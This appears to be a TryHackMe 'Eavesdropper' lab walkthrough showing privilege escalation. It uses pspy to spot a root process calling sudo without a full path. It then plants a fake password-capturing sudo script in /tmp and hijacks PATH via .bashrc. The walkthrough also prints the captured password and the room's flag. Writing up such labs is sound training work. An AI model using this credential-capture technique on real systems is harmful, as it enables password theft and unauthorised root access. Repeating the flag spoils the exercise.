# <div align="center">[Eavesdropper TryHackMe Walkthrough](https://tryhackme.com/room/eavesdropper)</div>
<div align="center">Listen closely, you might hear a password!</div>

<div align="center">
  <img width="200" height="200" alt="Eavesdropper" src="https://github.com/user-attachments/assets/5def88fb-4fbe-43a3-8deb-3f47cc4d6180" />
</div>

## Task 1. Download Keys

The room already provides an SSH private key for the user `frank`, so I started by downloading the attached key file and preparing it for SSH authentication.


Before using the key, I changed its permissions so SSH would accept it.

```bash
chmod 600 id-rsa-1647296932800.id-rsa
```

Once the permissions were fixed, I logged into the target machine as `frank`.

```bash
ssh frank@<IP> -i id-rsa-1647296932800.id-rsa
```

## Initial Enumeration

Since the room is called **Eavesdropper**, I immediately started looking for anything related to background activity or processes running on the machine.

To monitor processes from other users, including root, I decided to use `pspy64`. First, I downloaded the binary on my attacker machine and transferred it to the target using SCP.

```bash
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
```

```bash
scp -i id-rsa-1647296932800.id-rsa pspy64 frank@<IP>:.
```

After transferring the binary, I gave it execution permissions and started monitoring the running processes.

```bash
chmod +x pspy64
./pspy64
```

After letting it run for a few moments, several processes started appearing continuously. One process immediately stood out:

```bash
CMD: UID=0     PID=662    | sudo cat /etc/shadow
```

<div align="center">
  <img width="1082" height="930" alt="image" src="https://github.com/user-attachments/assets/3dced6ae-009d-4767-b747-0c7a57c6bd71" />
</div>

This was interesting because the command was being executed as root, but it was using `sudo` without a full path.

That behavior suggested the command might be vulnerable to PATH hijacking. It also looked like the process was being triggered automatically whenever a user logged in through SSH.

At this point, the goal became clear. If I could place a fake `sudo` binary earlier in the PATH, the system would execute my malicious version instead of the legitimate one.

## Privilege Escalation

To exploit this behavior, I created a fake `sudo` script inside `/tmp`.

```bash
cat > /tmp/sudo << 'EOF'
#!/bin/bash
read -p "Test" password
echo $password > /home/frank/pass.txt
EOF
```

The script simply waits for user input and stores whatever is entered into a file called `pass.txt`.

After creating the script, I made it executable.

```bash
chmod +x /tmp/sudo
```

Next, I modified `frank`’s PATH variable so the system would search `/tmp` before the legitimate system directories.

```bash
sed -i '4iPATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin' ~/.bashrc
```

To verify the change, I checked the first few lines of `.bashrc`.

```bash
head -n 6 ~/.bashrc
```

Then I reloaded the configuration.

```bash
source ~/.bashrc
```

## Triggering the Exploit

With everything prepared, I logged out and connected back through SSH.

```bash
exit
```

```bash
ssh -i id-rsa-1647296932800.id-rsa frank@<IP>
```

During login, the automated process executed `sudo cat /etc/shadow`.

Because `/tmp` appeared first in the PATH variable, the system executed my fake `sudo` script instead of the real binary. The password entered by root was captured and written into `/home/frank/pass.txt`.

<div align="center">
  <img width="1511" height="777" alt="1" src="https://github.com/user-attachments/assets/2d385b22-2da5-46d3-9696-859aa19bbe33" />
</div>

I checked the file and recovered the password:

```bash
!@#frankisawesome2022%*
```

## Root Access

Using the captured password, I switched to root.

```bash
/usr/bin/sudo su
```

```bash
[sudo] password for frank: !@#frankisawesome2022%*
```

<div align="center">
  <img width="496" height="226" alt="image" src="https://github.com/user-attachments/assets/caf786b1-4eef-4540-b5c4-645776da66c9" />
</div>

Once authenticated, I successfully gained root access and retrieved the flag from the root home directory.

## Flag

```bash
flag{14370304172628f784d8e8962d54a600}
```

<div align="center">
  <img width="842" height="386" alt="image" src="https://github.com/user-attachments/assets/16bf8138-8095-4852-b359-a77eb50d2b9f" />
</div>

## Conclusion

Eavesdropper was a short but interesting room focused on process monitoring and PATH hijacking. The biggest clue came from observing background activity with `pspy64`, which eventually revealed a vulnerable execution flow that could be abused to capture credentials and gain root access.

Thanks for reading this walkthrough. I hope it helped you understand the room and follow the privilege escalation process clearly.

You can check out more of my walkthroughs here:

* [Medium Blog](https://deathesther.medium.com/?utm_source=chatgpt.com)
* [GitHub Walkthrough Repository](https://github.com/Esther7171/TryHackMe-Walkthroughs?utm_source=chatgpt.com)
